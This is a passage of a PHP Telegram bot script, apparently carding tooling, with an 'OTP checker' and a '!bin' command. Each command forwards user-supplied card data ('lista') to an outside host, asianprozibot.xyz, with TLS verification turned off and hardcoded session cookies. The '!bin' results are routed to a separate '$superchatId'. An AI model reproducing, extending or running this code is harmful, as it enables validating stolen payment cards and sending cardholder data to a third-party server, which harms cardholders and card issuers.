        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else{
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.asianprozibot.xyz/telebotxxx/teleotp.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Upgrade-Insecure-Requests: 1'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
#----------------------------------------------------------------# MAIN CHECKER
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
}
else{
    $replyMsg = "*Sorry, OTP checker will be only available in trusted members.*";


    $parameters = array(
        "chat_id" => $userChatId,
        "text" => $replyMsg,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
}
else if ($comand == '!bin'){

#---------------------------------------------------------------------------------------------------------------------------------#BIN CHECK
#----------------------------------------------------------------# MAIN CHECKER
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$ccx);
$ccsx = $explode[0];
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.asianprozibot.xyz/telebotxxx/telebin.php?lista='.$ccsx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
#----------------------------------------------------------------# MAIN CHECKER
$parameters = array(
        "chat_id" => $superchatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
}

function send($method, $data){
    global $BOT_TOKEN;
    $url = "https://api.telegram.org/bot$BOT_TOKEN/$method";

    if(!$curld = curl_init()){
        exit;
    }
    curl_setopt($curld, CURLOPT_POST, true);
    curl_setopt($curld, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curld, CURLOPT_URL, $url);
    curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($curld);
    curl_close($curld);
    return $output;
}
?>